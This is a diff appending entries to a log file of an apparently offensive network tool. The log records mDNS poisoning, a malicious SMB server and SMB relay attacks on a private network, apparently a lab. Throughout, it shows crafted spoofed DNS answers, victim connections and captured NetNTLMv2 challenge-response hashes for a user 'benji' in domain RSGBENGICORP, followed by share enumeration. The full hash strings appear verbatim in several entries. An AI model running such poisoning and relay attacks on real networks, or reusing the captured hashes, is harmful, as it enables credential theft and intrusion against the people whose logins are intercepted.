@@ -8077,3 +8077,274 @@ impacket.nmb.NetBIOSError: Error while reading from remote
 2021-11-02 16:02:39.066 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
 2021-11-02 16:02:39.066 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
 2021-11-02 16:08:20.069 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:189 - Exiting smb relay attack ...
+2021-11-03 18:31:35.046 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:85 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 18:31:35.047 | INFO     | project.igris:show_settable_variables_necessary:210 - Showing necessary settable variables
+2021-11-03 18:32:43.193 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:85 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 18:32:43.194 | INFO     | project.igris:show_settable_variables_necessary:210 - Showing necessary settable variables
+2021-11-03 18:34:24.325 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:83 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 18:34:24.325 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 18:36:09.852 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:82 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 18:36:09.852 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 18:36:38.647 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:82 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 18:36:38.647 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 18:37:05.422 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:82 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 18:37:05.422 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 18:37:05.427 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 18:37:05.429 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 18:37:11.144 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 18:37:11.145 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 18:37:11.146 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-03 18:37:11.180 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 18:37:11.180 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 18:37:11.180 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-03 18:37:11.212 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 18:37:11.212 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 18:37:11.213 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 18:37:11.213 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 18:37:12.122 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 18:37:12.122 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 18:37:12.123 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 18:37:12.124 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 18:37:12.127 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49862)
+2021-11-03 18:37:12.610 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-03 18:37:12.612 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-11-03 18:37:12.614 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:c44e0bcaa624db62019e06ae13c13195:0101000000000000007cccd0e1d0d70124fcefab217cbd8b00000000010010007a004f00520054004b00530077004200030010007a004f00520054004b005300770042000200100046005100660079007500520056005000040010004600510066007900750052005600500007000800007cccd0e1d0d70106000400020000000800300030000000000000000000000000200000a83c2f4b01aa6db48244f3a58764a25907daad7ee20580caa7157fc5b8f574840a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
+2021-11-03 18:37:12.749 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-11-03 18:37:12.771 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-11-03 18:37:12.940 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-11-03 18:37:16.670 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:109 - Exiting smb relay attack ...
+2021-11-03 19:15:02.394 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:131 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 19:15:02.395 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 19:15:02.400 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 19:15:02.403 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 19:15:37.062 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 19:15:37.063 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 19:15:37.063 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-03 19:15:37.100 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 19:15:37.101 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 19:15:37.101 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-03 19:15:37.140 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 19:15:37.140 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 19:15:37.141 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 19:15:37.141 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 19:15:38.074 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,62797)
+2021-11-03 19:15:38.106 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-03 19:15:38.106 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-11-03 19:15:38.107 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:be67b028077ac3fd62b061dbb8c33aa4:01010000000000000029482fe7d0d70141242b69bb3be02f00000000010010006f0051004c00540049007a0057006700030010006f0051004c00540049007a005700670002001000580053004700550042004f006b004f0004001000580053004700550042004f006b004f00070008000029482fe7d0d70106000400020000000800300030000000000000000000000000200000a83c2f4b01aa6db48244f3a58764a25907daad7ee20580caa7157fc5b8f574840a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
+2021-11-03 19:15:38.127 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-11-03 19:15:38.144 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-11-03 19:15:38.175 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-11-03 19:15:40.778 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:74 - Exiting smb relay attack ...
+2021-11-03 20:20:55.336 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:131 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:20:55.336 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:20:55.340 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:85 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:20:55.341 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:20:55.343 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:35:00.445 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:132 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:35:00.445 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:35:00.451 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:35:00.453 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:35:00.456 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:35:15.492 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:37:20.149 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:133 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:37:20.150 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:37:20.159 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:37:20.161 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:37:20.164 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:37:22.306 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:37:39.876 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:134 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:37:39.876 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:37:39.880 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:37:39.883 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:37:39.885 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:37:41.282 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:47:54.446 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:138 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:47:54.447 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:47:54.454 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:86 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:47:54.457 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:47:54.459 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:48:06.841 | DEBUG    | project.ManInTheMiddle.maninthemiddle:__try_exit:52 - Block exit ...
+2021-11-03 20:48:52.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:52.630 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:52.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-03 20:48:52.678 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:52.679 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:52.679 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-03 20:48:53.091 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:53.091 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:53.094 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:53.094 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:53.096 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:53.096 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:53.099 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:53.099 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:53.505 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:53.506 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:53.511 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:53.511 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.086 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:54.087 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.088 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:54.088 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.213 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:54.214 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.217 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:54.217 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.514 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:54.514 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.515 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-03 20:48:54.562 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:54.563 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:54.563 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-03 20:48:56.182 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:56.183 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:56.189 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:56.190 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:56.194 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:56.195 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:56.197 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:56.197 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.306 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.307 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.309 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.309 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.316 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.316 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.318 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.318 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.349 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.349 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.787 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.787 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:58.789 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:58.790 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.041 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.041 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.045 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.045 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.049 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.049 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.053 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.053 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.292 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.293 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.297 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.297 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.778 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.779 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.780 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.780 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:48:59.783 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:48:59.783 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.030 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.030 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.033 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.033 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.036 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.037 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.790 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.790 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.792 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.793 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.794 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.795 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:00.796 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:00.797 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:02.804 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:02.805 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:02.806 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:02.806 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:02.807 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:02.807 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:02.808 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:02.808 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.252 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.252 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.257 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
